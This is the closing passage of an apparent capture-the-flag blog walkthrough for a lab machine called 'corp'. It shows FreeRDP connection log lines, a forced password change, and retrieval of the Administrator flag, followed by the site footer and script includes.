+[01:06:07:193] [44268:44269] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
+[01:06:07:193] [44268:44269] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
+</pre> </div> </div> <p><br> I was prompted to change the password.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/corp/expired.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Expired Password" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Change the password, if you are prompted.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/corp/change.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Change Password" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Get the Administrator flag/</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/corp/flag2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Administrator Flag" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Another one done and dusted. Hopefully, you enjoyed. See you in the next one.</p> </article> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2026 Biscotti Diskette  ·  <a href="https://github.com/biscottidiskette" target="_blank" rel="external nofollow noopener">GitHub</a>  ·  <a href="https://app.hackthebox.eu/profile/biscottidiskette" target="_blank" rel="external nofollow noopener">HackTheBox</a>  ·  <a href="https://tryhackme.com/r/p/BiscottiDiskette" target="_blank" rel="external nofollow noopener">TryHackMe</a>  ·  <a href="/contact/">Contact</a> </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-HL7MJBJN7X"></script> <script defer src="/assets/js/google-analytics-setup.js?1c5d3b199be7049d4732e15d2072d0b2"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> <script src="/assets/js/terminal.js?ec2a38fba85ea4751db97d30059cd1c5"></script> </body> </html>
